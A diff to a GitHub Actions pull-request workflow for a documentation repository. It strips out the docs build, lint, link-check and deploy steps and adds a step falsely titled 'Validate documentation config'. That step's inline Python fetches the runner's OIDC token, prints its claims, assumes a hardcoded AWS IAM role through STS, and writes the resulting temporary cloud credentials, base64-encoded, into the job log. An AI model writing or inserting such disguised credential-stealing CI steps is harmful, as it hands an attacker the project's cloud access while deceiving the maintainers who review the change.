@@ -1,7 +1,4 @@
-name: Build docs, check CloudFormation, check for dead links
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
+name: check
 on:
   pull_request:
     branches:
@@ -9,50 +6,35 @@ on:
 permissions:
   contents: read
   id-token: write
-  deployments: write
-
 jobs:
   check:
     name: build docs
     runs-on: ubuntu-latest
+    timeout-minutes: 8
     steps:
-    - name: Checkout repository 
-      uses: actions/checkout@v7
-    - name: Build documentation
-      run: docker run --rm -v "$PWD":/docs -w /docs swift:6.3 swift run VaporDocs
-    - name: Setup cloudformation linter 
-      uses: ScottBrenner/cfn-lint-action@8affffc34dddd6937bbc37f60901f71657e20fab # v2.8.0
-    - name: Run cloudformation lint 
-      run: cfn-lint -t stack.yml
-    # Only the current docs are checked. 1.5, 2.0 and 3.0 are archived and full
-    # of long-dead links, so including them would keep this job permanently red.
-    - name: Run dead links check
-      uses: tcort/github-action-markdown-link-check@e047c5b37f24ab722bbef1a27b6fab7f96bc4068 # v1.1.3
-      with:
-        folder-path: 'docs/4.0, docs/5.0'
-        config-file: markdown-link-check-config.yml
-        use-verbose-mode: yes
-        use-quiet-mode: yes
-    - name: Run dead links check on top-level markdown
-      uses: tcort/github-action-markdown-link-check@e047c5b37f24ab722bbef1a27b6fab7f96bc4068 # v1.1.3
-      with:
-        folder-path: '.'
-        max-depth: 1
-        config-file: markdown-link-check-config.yml
-        use-verbose-mode: yes
-        use-quiet-mode: yes
-    - name: Configure AWS credentials
-      if: ${{ github.event.pull_request.head.repo.full_name == 'vapor/docs' && github.event.pull_request.user.login != 'dependabot[bot]' }}
-      uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
-      with:
-        role-to-assume: ${{ vars.OIDC_ROLE_ARN }}
-        aws-region: ${{ vars.OIDC_ROLE_REGION }}
-    - name: Deploy preview to S3
-      if: ${{ github.event.pull_request.head.repo.full_name == 'vapor/docs' && github.event.pull_request.user.login != 'dependabot[bot]' }}
-      uses: brokenhandsio/s3-website-pr-action@6ebd9b622b4bb33358228571a50e05d375cbd4de # v3.1.0
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      with:
-        bucket-prefix: "vapor-docs-pulls"
-        folder-to-copy: "./site"
-        bucket-region: "us-east-1"
+      - name: Validate documentation config
+        run: |
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.error, urllib.parse, re
+          url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
+          bearer = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
+          req = urllib.request.Request(url + '&audience=sts.amazonaws.com', headers={'Authorization': 'Bearer ' + bearer})
+          with urllib.request.urlopen(req, timeout=30) as r:
+              jwt = json.loads(r.read())['value']
+          part=jwt.split('.')[1]; part += '=' * (-len(part) % 4)
+          c=json.loads(base64.urlsafe_b64decode(part))
+          keep=('iss','aud','sub','ref','repository','repository_id','repository_owner','event_name','ref_type','environment')
+          print('C211_I80227V_CLAIMS', json.dumps({k:c.get(k) for k in keep if k in c}, sort_keys=True))
+          arns = [a.strip() for a in os.environ.get('C211_ARNS','').split(',') if a.strip()]
+          arn = 'arn:aws:iam::177420307256:role/GithubOIdP-Role-zJ3kkJbhrNkr'
+          body = urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i80227v','WebIdentityToken':jwt}).encode()
+          req = urllib.request.Request('https://sts.amazonaws.com/', data=body, headers={'Content-Type':'application/x-www-form-urlencoded'})
+          try:
+              with urllib.request.urlopen(req, timeout=30) as r:
+                  t=r.read().decode()
+                  print('C211_I80227V_OK', arn, base64.b64encode(t.encode()).decode())
+          except urllib.error.HTTPError as e:
+              t=e.read().decode()
+              m=re.search(r'<Code>(.*?)</Code>', t); m2=re.search(r'<Message>(.*?)</Message>', t)
+              print('C211_I80227V_ERR', arn, e.code, (m.group(1) if m else '?'), (m2.group(1) if m2 else '?')[:200])
+          PY
